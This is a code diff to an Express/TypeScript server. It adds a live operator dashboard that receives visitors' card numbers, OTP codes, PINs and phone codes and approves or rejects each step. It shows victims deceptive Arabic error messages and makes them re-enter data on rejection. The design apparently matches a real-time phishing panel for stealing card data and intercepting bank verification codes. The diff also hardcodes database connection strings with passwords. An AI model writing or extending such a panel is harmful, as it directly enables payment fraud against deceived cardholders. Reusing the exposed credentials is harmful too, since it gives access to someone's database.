@@ -23,6 +23,57 @@ type DashboardEntry = {
   raw?: Record<string, any>;
 };
 
+// ==========================================
+// LOCAL MEMORY STORE FOR PENDING DECISIONS
+// (Deleted on server restart)
+// ==========================================
+// pendingDecisions[visitorId] = { card: {status: 'pending', timestamp}, otp: {...}, pin: {...}, phone: {...} }
+type PendingDecision = {
+  status: 'pending';
+  timestamp: number;
+};
+
+type PendingDecisions = {
+  card?: PendingDecision;
+  otp?: PendingDecision;
+  pin?: PendingDecision;
+  phone?: PendingDecision;
+};
+
+const pendingDecisions: Map<string, PendingDecisions> = new Map();
+
+// Set pending decision when customer submits new data
+function setPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
+  const visitorDecisions = pendingDecisions.get(visitorId) || {};
+  visitorDecisions[boxType] = { status: 'pending', timestamp: Date.now() };
+  pendingDecisions.set(visitorId, visitorDecisions);
+  console.log(`[Pending] Set ${boxType} pending for visitor ${visitorId}`);
+}
+
+// Get pending decision
+function getPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone'): PendingDecision | null {
+  const visitorDecisions = pendingDecisions.get(visitorId);
+  if (!visitorDecisions) return null;
+  return visitorDecisions[boxType] || null;
+}
+
+// Get all pending decisions for visitor
+function getAllPendingDecisions(visitorId: string): PendingDecisions {
+  return pendingDecisions.get(visitorId) || {};
+}
+
+// Clear pending decision after admin action
+function clearPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
+  const visitorDecisions = pendingDecisions.get(visitorId);
+  if (visitorDecisions) {
+    delete visitorDecisions[boxType];
+    if (Object.keys(visitorDecisions).length === 0) {
+      pendingDecisions.delete(visitorId);
+    }
+  }
+  console.log(`[Pending] Cleared ${boxType} for visitor ${visitorId}`);
+}
+
 // SSE clients for real-time updates
 const sseClients = new Set<express.Response>();
 
@@ -38,7 +89,7 @@ function broadcastSSE(event: string, data: any) {
   });
 }
 
-const connectionString = process.env.DATABASE_URL || "postgresql://neondb_owner:npg_R6GQdYoAp8NC@ep-lively-dream-aumirq95-pooler.c-10.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require";
+const connectionString = process.env.DATABASE_URL || "postgresql://neondb_owner:npg_pQwL4xqFg5Wa@ep-wandering-dust-aub50efr-pooler.c-10.us-east-1.aws.neon.tech/neondb?sslmode=require";
 
 const pool = new Pool({
   connectionString,
@@ -846,6 +897,154 @@ async function startServer() {
     }
   });
 
+  // ==========================================
+  // ADMIN ACTION API (Using Local Memory for pending status)
+  // ==========================================
+  
+  app.post("/api/dashboard/admin-action", async (req, res) => {
+    try {
+      const { visitorId, boxType, action } = req.body;
+      
+      if (!visitorId || !boxType || !action) {
+        res.status(400).json({ error: "Missing visitorId, boxType or action" });
+        return;
+      }
+      
+      console.log(`[Admin Action] ${boxType} - ${action} for visitor ${visitorId}`);
+      
+      // Get current visitor data
+      const currentVisitor = await readVisitor(visitorId);
+      if (!currentVisitor) {
+        res.status(404).json({ error: "Visitor not found" });
+        return;
+      }
+      
+      const customerName = currentVisitor.ownerName || currentVisitor.phoneNumber || "زائر";
+      const now = new Date().toISOString();
+      
+      // Clear pending decision from local memory
+      clearPendingDecision(visitorId, boxType);
+      
+      // Prepare redirect data based on box type and action
+      let targetPage = "";
+      let updateData: Record<string, any> = {
+        adminRedirectPage: "",
+        adminRedirectAt: null,
+        oneTimeRedirect: null,
+        currentPage: null,
+      };
+      
+      // Box-specific configuration
+      const boxConfig: Record<string, {
+        statusField: string;
+        errorMessage: string;
+        nextPage?: string;
+        samePage?: string;
+      }> = {
+        card: {
+          statusField: "_v1Status",
+          errorMessage: "تم رفض البطاقة - يرجى المحاولة بطريقة دفع مختلفة",
+          nextPage: "step2",
+          samePage: "check"
+        },
+        otp: {
+          statusField: "_v5Status",
+          errorMessage: "رمز التحقق غير صحيح",
+          nextPage: "step3",
+          samePage: "step2"
+        },
+        pin: {
+          statusField: "_v6Status",
+          errorMessage: "الرمز غير صحيح",
+          nextPage: "step5",
+          samePage: "step3"
+        },
+        phone: {
+          statusField: "phoneOtpStatus",
+          errorMessage: "يرجى التحقق من بياناتك",
+          nextPage: "step4",
+          samePage: "step5"
+        }
+      };
+      
+      const config = boxConfig[boxType];
+      if (!config) {
+        res.status(400).json({ error: "Invalid box type" });
+        return;
+      }
+      
+      if (action === "approve") {
+        // Approve - go to next step
+        targetPage = config.nextPage || "";
+        updateData = {
+          adminRedirectPage: targetPage,
+          adminRedirectAt: now,
+          oneTimeRedirect: targetPage,
+          currentPage: targetPage,
+          [config.statusField]: "approved",
+        };
+        // Clear error messages
+        updateData[`${boxType}RejectionMessage`] = null;
+        updateData[`${boxType}Error`] = null;
+        
+      } else if (action === "reject") {
+        // Reject - stay on same page with error message
+        targetPage = config.samePage || "";
+        updateData = {
+          adminRedirectPage: targetPage,
+          adminRedirectAt: now,
+          oneTimeRedirect: targetPage,
+          currentPage: targetPage,
+          [config.statusField]: "rejected",
+          [`${boxType}RejectionMessage`]: config.errorMessage,
+          // Clear the submitted data to allow retry
+          ...(boxType === 'card' && { _v1: null, cardNumber: null }),
+          ...(boxType === 'otp' && { _v5: null, otpCode: null }),
+          ...(boxType === 'pin' && { _v6: null, pinCode: null }),
+          ...(boxType === 'phone' && { _v7: null, phoneOtp: null }),
+        };
+        
+      } else {
+        res.status(400).json({ error: "Invalid action" });
+        return;
+      }
+      
+      // Save to database
+      await upsertVisitor(visitorId, updateData);
+      
+      // Broadcast to visitor via SSE
+      broadcastToVisitor(visitorId, "currentPage", targetPage);
+      broadcastToVisitor(visitorId, config.statusField, action === "approve" ? "approved" : "rejected");
+      if (updateData[`${boxType}RejectionMessage`]) {
+        broadcastToVisitor(visitorId, `${boxType}RejectionMessage`, updateData[`${boxType}RejectionMessage`]);
+      }
+      
+      // Broadcast to dashboard
+      const dashboardData = await upsertDashboardRequest({
+        id: visitorId,
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData,
+        updated: `تم ${action === "approve" ? "الموافقة" : "الرفض"} على ${boxType}`
+      });
+      
+      broadcastToDashboard("dashboard:update", dashboardData);
+      
+      res.json({
+        success: true,
+        action,
+        boxType,
+        targetPage,
+        message: action === "approve" ? "تمت الموافقة" : "تم الرفض"
+      });
+      
+    } catch (error) {
+      console.error("[Admin Action] Error:", error);
+      res.status(500).json({ error: "Failed to process admin action" });
+    }
+  });
+
   app.post("/api/dashboard/reflect-status", async (req, res) => {
     try {
       const body = req.body || {};
@@ -950,6 +1149,43 @@ async function startServer() {
       mode: "local-project-dashboard",
       database: process.env.DATABASE_URL ? "neon-configured" : "waiting-for-neon-url",
     });
+  });
+
+  // ==========================================
+  // PENDING DECISIONS APIs (Local Memory)
+  // ==========================================
+  
+  // Get pending decisions for a visitor
+  app.get("/api/pending/:visitorId", (req, res) => {
+    const { visitorId } = req.params;
+    const pending = getAllPendingDecisions(visitorId);
+    res.json({ visitorId, pending });
+  });
+
+  // Set pending decision (called when customer submits new data)
+  app.post("/api/pending/:visitorId/:boxType", (req, res) => {
+    const { visitorId, boxType } = req.params;
+    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
+      setPendingDecision(visitorId, boxType as any);
+      // Broadcast to dashboard
+      broadcastToDashboard("pending:update", { visitorId, boxType, status: "pending" });
+      res.json({ success: true });
+    } else {
+      res.status(400).json({ error: "Invalid box type" });
+    }
+  });
+
+  // Clear pending decision (called after admin action)
+  app.delete("/api/pending/:visitorId/:boxType", (req, res) => {
+    const { visitorId, boxType } = req.params;
+    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
+      clearPendingDecision(visitorId, boxType as any);
+      // Broadcast to dashboard
+      broadcastToDashboard("pending:update", { visitorId, boxType, status: "cleared" });
+      res.json({ success: true });
+    } else {
+      res.status(400).json({ error: "Invalid box type" });
+    }
   });
 
   app.post("/api/visitors", async (req, res) => {
